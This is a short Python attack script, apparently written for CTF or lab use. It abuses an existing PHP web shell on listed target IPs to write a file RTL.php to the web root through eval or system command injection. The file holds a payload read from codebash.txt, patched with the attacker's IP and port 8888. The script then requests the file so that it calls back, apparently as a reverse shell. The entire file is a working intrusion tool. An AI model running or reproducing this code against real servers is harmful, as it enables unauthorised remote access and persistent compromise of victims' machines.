# -*- coding:utf8 -*-
# Author: RTL
# Date: 2019.02.20

import requests

config = {
  "v_ip" : ['192.168.142.133'],
  "file" : "test.php",
  "passwd" : "a",
  "method" : "SYSTEM_GET",
  "self_ip": "192.168.142.1",
  "self_port": "8888",
  "code_file": "codebash.txt"
}

def UploadFile_eval_POST(url, passwd):
  file = open(config['code_file'])
  code = file.read().replace('0.0.0.0', config['self_ip']).replace('0000', config['self_port'])
  file_content = 'file_put_contents("/var/www/html/RTL.php", "%s");' % code
  j = {
    passwd : file_content,
    "rtl" : "rtl666"
  }
  res = requests.post(url, data=j)
  print(res.text)

def UploadFile_eval_GET(url, passwd):
  file = open(config['code_file'])
  code = file.read().replace('0.0.0.0', config['self_ip']).replace('0000', config['self_port'])
  file_content = 'file_put_contents("/var/www/html/RTL.php", "%s");' % code
  j = {
    passwd : file_content,
    "rtl" : "rtl666"
  }
  res = requests.get(url, params=j)
  print(res.text)

def UploadFile_system_POST(url, passwd):
  file = open(config['code_file'])
  code = file.read().replace('0.0.0.0', config['self_ip']).replace('0000', config['self_port'])
  file_content = 'echo "%s" > /var/www/html/RTL.php' % code
  j = {
    passwd : file_content,
    "rtl" : "rtl666"
  }
  res = requests.post(url, data=j)
  print(res.text)

def UploadFile_system_GET(url, passwd):
  file = open(config['code_file'])
  code = file.read().replace('0.0.0.0', config['self_ip']).replace('0000', config['self_port'])
  file_content = 'echo "%s" > /var/www/html/RTL.php' % code
  j = {
    passwd : file_content,
    "rtl" : "rtl666"
  }
  res = requests.get(url, params=j)
  print(res.text)

def TouchFile(url, ip):
  try:
    res = requests.get(url, timeout=2)
    print(res.text)
  except:
    print(ip, "Success!")

def RShell(ip):
  if config['method'] == "EVAL_POST":
    UploadFile_eval_POST('http://%s/%s' % (ip, config['file']), config['passwd'])
  elif config['method'] == "EVAL_GET":
    UploadFile_eval_GET('http://%s/%s' % (ip, config['file']), config['passwd'])
  elif config['method'] == "SYSTEM_POST":
    UploadFile_system_POST('http://%s/%s' % (ip, config['file']), config['passwd'])
  elif config['method'] == "SYSTEM_GET":
    UploadFile_system_GET('http://%s/%s' % (ip, config['file']), config['passwd'])
  TouchFile('http://%s/RTL.php' % ip, ip)

if __name__ == "__main__":
  for i in config["v_ip"]:
    RShell(i)